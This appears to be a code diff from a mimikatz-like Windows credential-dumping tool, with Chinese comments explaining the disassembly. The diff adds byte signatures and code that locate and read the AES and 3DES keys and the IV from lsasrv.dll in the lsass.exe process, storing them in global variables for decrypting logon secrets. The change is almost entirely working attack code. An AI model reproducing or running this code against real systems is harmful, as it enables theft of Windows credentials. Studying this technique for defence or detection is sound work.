@@ -53,7 +53,7 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	DWORD aesSigOffset = 0, desSigOffset = 0, ivSigOffset = 0;
 	KIWI_BCRYPT_HANDLE_KEY hAesKey, hDesKey;
 	KIWI_BCRYPT_KEY81 extractedAesKey, extracted3DesKey;
-	PVOID aesPointer = NULL, desPointer = NULL;
+	PVOID keyPointer = NULL;
 
 	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");
 	// 将lsass.exe所加载的模块lsasrv.dll加载入当前进程的内存空间中
@@ -68,12 +68,11 @@ VOID LocateUnprotectLsassMemoryKeys() {
 						0x44, 0x8b, 0x4d, 0xd8,
 						0x48, 0x8d, 0x15 };
 	UCHAR keyDESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
-						0x48, 0x8d, 0x45, 0xe0,
-						0x44, 0x8b, 0x4d, 0xd8,
+						0x48, 0x8d, 0x45, 0xe0,//48  8D 45 E0
+						0x44, 0x8b, 0x4d, 0xd4,//44 8B 4D D4
 						0x48, 0x8d, 0x15 };
-	UCHAR keyIVSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
-						0x48, 0x8d, 0x45, 0xe0,
-						0x44, 0x8b, 0x4d, 0xd8,
+	UCHAR keyIVSig[] = { 0x44, 0x8d, 0x4e, 0xf2, //44 8D 4E F2
+						0x44, 0x8b, 0xc6, // 44 8B C6
 						0x48, 0x8d, 0x15 };
 	// lsasrv.dll 中 keyAESSig 字节序列所对应的指令反汇编，其中 99 2C 10 00 (小端数 0x102c99)
 	// 为全局变量 hAesKey 所在地址相对下一条指令地址0x1800752BF的偏移
@@ -105,8 +104,8 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	// 获取首条指令 and [rsp+70h+var_40], 0 相对lsasrv.dll模块基址的偏移
 	aesSigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
 	desSigOffset = SearchPattern(lsasrvBaseAddress, keyDESSig, sizeof keyDESSig);
-	ivOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
-	wprintf(L"aesSigOffset = 0x%x\ndesSigOffset = 0x%x\n", aesSigOffset,desSigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
+	ivSigOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
+	wprintf(L"aesSigOffset = 0x%x\ndesSigOffset = 0x%x\nivSigOffset = 0x%x\n", aesSigOffset,desSigOffset,ivSigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
 	if (aesSigOffset != 0) {
 		// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig 上读取4字节的偏移
 		//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
@@ -123,11 +122,11 @@ VOID LocateUnprotectLsassMemoryKeys() {
 		// .data:0000000180177F58 ?? ?? ?? ?? ?? ?? ?? ?? ?hAesKey@@3PEAXEA dq ?
 		// 所读取的8字节的数据是一个指向结构体 KIWI_BCRYPT_HANDLE_KEY 的指针
 
-		ReadFromLsass(lsasrvBaseAddress + aesSigOffset + sizeof keyAESSig + 4 + aesOffset, &aesPointer, sizeof aesPointer);
-		wprintf(L"aesPointer = 0x%p\n", aesPointer); // 形如 0x000002318B910230
+		ReadFromLsass(lsasrvBaseAddress + aesSigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
+		wprintf(L"aesPointer = 0x%p\n", keyPointer); // 形如 0x000002318B910230
 
 		// 从lsass进程的内存位置 keyPointer 读取出结构体的实际内容
-		ReadFromLsass(aesPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
+		ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
 
 		// 读取 KIWI_BCRYPT_HANDLE_KEY 结构体中
 		// 类型为 PKIWI_BCRYPT_KEY81 的成员变量指针所指向的 KIWI_BCRYPT_KEY81 结构体
@@ -143,16 +142,23 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	// DES部分
 	if (desSigOffset != 0) {
 		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig, &desOffset, sizeof desOffset);
-		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig + 4 + desOffset, &desPointer, sizeof desPointer);
-		wprintf(L"desOffset = 0x%x\ndesPointer = 0x%p\n", desOffset, desPointer);
-		ReadFromLsass(desPointer, &hDesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
+		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
+		wprintf(L"desOffset = 0x%x\ndesPointer = 0x%p\n", desOffset, keyPointer);
+		ReadFromLsass(keyPointer, &hDesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
 		ReadFromLsass(hDesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81));
+
+		memcpy(g_sekurlsa_3DESKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
 		wprintf(L"DES Key Located (len %d): ", extracted3DesKey.hardkey.cbSecret);
-		HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
+		HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);// 回显罢了
 	}
 	// IV部分
 	if (ivSigOffset != 0) {
-		
+		BYTE initializationVector[16] = { 1 };
+		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
+		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset, g_sekurlsa_IV, sizeof g_sekurlsa_IV);
+		//ReadFromLsass(ivPointer, initializationVector, sizeof(initializationVector));
+		wprintf(L"IV Located (len %d): ", AES_128_KEY_LENGTH);
+		HexdumpBytesPacked(g_sekurlsa_IV, AES_128_KEY_LENGTH);
 	}
 }
 
